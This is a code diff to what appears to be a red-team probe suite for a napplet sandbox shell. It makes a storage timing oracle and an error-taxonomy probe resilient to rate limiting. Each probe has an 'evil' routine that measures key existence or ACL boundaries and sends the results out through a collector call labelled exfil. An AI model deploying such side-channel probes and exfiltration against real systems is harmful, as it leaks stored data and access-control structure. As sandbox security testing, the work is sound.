@@ -13,15 +13,67 @@ function preSpecStorage(st) {
   return 'storage domain is not NAP-STORAGE shaped (no getItem' + (legacy.length ? '; pre-spec ' + legacy.join('/') + ' only' : '') + ') — probe not run';
 }
 
+// napplet/evil#4: a shell that rate-limits mediated calls answers every
+// over-budget request with the same limiter error. Timing those rejections, or
+// classifying them as a taxonomy, measures the limiter instead of the oracle.
+// So the sweep is paced (≤ 7 calls/s), limiter rejections are never timed or
+// classified, and a limited case backs off once before it's retried.
+const EVIL06_SAMPLE_GAP_MS = 150;
+const EVIL06_LIMIT_BACKOFF_MS = 3500;
+const EVIL06_LIMITER = /rate.?limit|too many requests|throttl|burst|busy/i;
+
+function evil06Pause(ms) { return new Promise((resolve) => setTimeout(resolve, ms)); }
+
+// Median latency over the samples the shell actually served. Non-limiter
+// errors are timed (a fast rejection is still an answer); limiter rejections
+// are counted and skipped, with one backoff on the first.
 async function timeKey(key, samples) {
   const st = window.napplet && window.napplet.storage;
   const times = [];
+  let limited = 0;
   for (let i = 0; i < samples; i++) {
+    if (i) await evil06Pause(EVIL06_SAMPLE_GAP_MS);
     const t = performance.now();
-    try { await st.getItem(key); } catch (_) { /* timed either way */ }
+    try { await st.getItem(key); } catch (e) {
+      if (EVIL06_LIMITER.test(errMsg(e))) {
+        if (!limited++) await evil06Pause(EVIL06_LIMIT_BACKOFF_MS);
+        continue;
+      }
+    }
     times.push(performance.now() - t);
   }
-  return times.sort((a, b) => a - b)[Math.floor(times.length / 2)];
+  const median = times.length ? times.sort((a, b) => a - b)[Math.floor(times.length / 2)] : NaN;
+  return { median: median, served: times.length, limited: limited };
+}
+
+// One error-taxonomy case → a comparable outcome signature. Errors keep their
+// message, so identical errors collapse into one signature. A limiter
+// rejection is retried once after a backoff, then reported as `limited`.
+async function taxonomyCase(fn) {
+  for (let attempt = 0; ; attempt++) {
+    try {
+      const v = await fn();
+      return { sig: v === undefined ? 'ok' : 'resolved ' + (v === null ? 'null' : typeof v) };
+    } catch (e) {
+      const msg = errMsg(e);
+      if (!EVIL06_LIMITER.test(msg)) return { sig: 'error ' + msg };
+      if (attempt) return { limited: msg };
+      await evil06Pause(EVIL06_LIMIT_BACKOFF_MS);
+    }
+  }
+}
+
+async function runTaxonomy(st) {
+  const cases = {
+    'get-missing': () => st.getItem('__evil06_missing__' + randId()),
+    'set-oversized': async () => { await st.setItem('__evil06_big__', 'x'.repeat(600 * 1024)); await st.removeItem('__evil06_big__'); },
+    'set-ok': async () => { await st.setItem('__evil06_probe__', '1'); await st.removeItem('__evil06_probe__'); },
+  };
+  const results = [];
+  for (const name of Object.keys(cases)) {
+    results.push(Object.assign({ name: name }, await taxonomyCase(cases[name])));
+  }
+  return results;
 }
 
 const ATTACKS = [
@@ -37,21 +89,31 @@ const ATTACKS = [
       if (!st) return na('no injected storage domain — no mediation to time');
       const gap = preSpecStorage(st);
       if (gap) return na(gap);
-      const hit = await timeKey('__evil06_seeded__', 12);
-      const miss = await timeKey('__evil06_missing__' + randId(), 12);
+      const hitRun = await timeKey('__evil06_seeded__', 12);
+      const missRun = await timeKey('__evil06_missing__' + randId(), 12);
+      const limits = 'served ' + hitRun.served + '+' + missRun.served + '/24, ' + (hitRun.limited + missRun.limited) + ' rate-limited';
+      if (hitRun.served < 6 || missRun.served < 6) {
+        return na('too few served samples to time (' + limits + ') — the shell rate limiter answered instead; oracle not measured');
+      }
+      const hit = hitRun.median;
+      const miss = missRun.median;
       const delta = hit - miss;
       return delta > 8
-        ? armed('timing oracle: existing key ~' + Math.round(hit) + 'ms vs missing ~' + Math.round(miss) + 'ms (Δ' + Math.round(delta) + 'ms) — key EXISTENCE readable through latency, key shapes enumerable')
-        : na('no measurable separation (Δ' + Math.round(Math.abs(delta)) + 'ms < 8ms) — oracle closed on this backend');
+        ? armed('timing oracle: existing key ~' + Math.round(hit) + 'ms vs missing ~' + Math.round(miss) + 'ms (Δ' + Math.round(delta) + 'ms; ' + limits + ') — key EXISTENCE readable through latency, key shapes enumerable')
+        : na('no measurable separation (Δ' + Math.round(Math.abs(delta)) + 'ms < 8ms; ' + limits + ') — oracle closed on this backend');
     },
     async evil() {
       const st = window.napplet && window.napplet.storage;
       const out = {};
       if (!st) { out.error = 'no injected storage domain'; return out; }
       if (preSpecStorage(st)) { out.error = preSpecStorage(st); return out; }
-      out.hit = Math.round(await timeKey('__evil06_seeded__', 40));
-      out.miss = Math.round(await timeKey('__evil06_missing__' + randId(), 40));
-      out.oracle = out.hit - out.miss > 8 ? 'key existence readable (Δ' + (out.hit - out.miss) + 'ms)' : 'not separable';
+      const hitRun = await timeKey('__evil06_seeded__', 40);
+      const missRun = await timeKey('__evil06_missing__' + randId(), 40);
+      out.hit = Math.round(hitRun.median);
+      out.miss = Math.round(missRun.median);
+      out.limited = hitRun.limited + missRun.limited;
+      out.oracle = hitRun.served < 20 || missRun.served < 20 ? 'not measured (rate-limited)'
+        : out.hit - out.miss > 8 ? 'key existence readable (Δ' + (out.hit - out.miss) + 'ms)' : 'not separable';
       out.exfil = await sendToCollector('storage-timing-oracle', out);
       return out;
     },
@@ -92,35 +154,24 @@ const ATTACKS = [
       if (!st) return na('no injected storage domain — no error surface to classify');
       const gap = preSpecStorage(st);
       if (gap) return na(gap);
-      const errors = [];
-      const kinds = new Set();
-      try {
-        const v = await st.getItem('__evil06_missing__' + randId());
-        errors.push('get-missing: resolved ' + JSON.stringify(v)); kinds.add(v === null ? 'get-missing-null' : 'get-missing-value');
-      } catch (e) { errors.push('get-missing: ' + errMsg(e)); kinds.add('get-missing'); }
-      try {
-        const big = 'x'.repeat(600 * 1024);
-        await st.setItem('__evil06_big__', big);
-        await st.removeItem('__evil06_big__');
-      } catch (e) { errors.push('set-oversized: ' + errMsg(e)); kinds.add('set-oversized'); }
-      try {
-        await st.setItem('__evil06_probe__', '1');
-        await st.removeItem('__evil06_probe__');
-        kinds.add('set-ok');
-        errors.push('set-ok: allowed');
-      } catch (e) { errors.push('set-ok-threw: ' + errMsg(e)); kinds.add('set-denied'); }
-      return kinds.size >= 2
-        ? armed('distinct error/response kinds observable (' + Array.from(kinds).join(', ') + '): ' + errors.join(' | ') + ' — taxonomy maps ACL boundaries')
-        : na('undifferentiated errors (' + errors.join(' | ') + ') — taxonomy not informative');
+      // Compare what each case actually answered (error messages included),
+      // not which case threw: three identical errors are one signature.
+      const results = await runTaxonomy(st);
+      const seen = results.map((r) => r.name + ': ' + (r.sig || 'rate-limited (' + r.limited + ')')).join(' | ');
+      const measured = results.filter((r) => r.sig);
+      if (measured.length < 2) return na('rate limiter answered the cases (' + seen + ') — taxonomy not measured');
+      const sigs = new Set(measured.map((r) => r.sig));
+      const hasError = measured.some((r) => r.sig.indexOf('error ') === 0);
+      return sigs.size >= 2 && hasError
+        ? armed(sigs.size + ' distinct answers across ' + measured.length + ' cases (' + seen + ') — the error taxonomy maps ACL boundaries')
+        : na('undifferentiated answers (' + seen + ') — taxonomy not informative');
     },
     async evil() {
       const st = window.napplet && window.napplet.storage;
       const out = { errors: [] };
       if (!st) { out.error = 'no injected storage domain'; return out; }
       if (preSpecStorage(st)) { out.error = preSpecStorage(st); return out; }
-      try { out.errors.push('get-missing: resolved ' + JSON.stringify(await st.getItem('__evil06_missing__' + randId()))); } catch (e) { out.errors.push('get-missing: ' + errMsg(e)); }
-      try { await st.setItem('__evil06_big__', 'x'.repeat(600 * 1024)); } catch (e) { out.errors.push('set-oversized: ' + errMsg(e)); }
-      try { await st.setItem('__evil06_probe__', '1'); await st.removeItem('__evil06_probe__'); } catch (e) { out.errors.push('set: ' + errMsg(e)); }
+      for (const r of await runTaxonomy(st)) out.errors.push(r.name + ': ' + (r.sig || 'rate-limited (' + r.limited + ')'));
       out.exfil = await sendToCollector('error-taxonomy', out.errors);
       return out;
     },
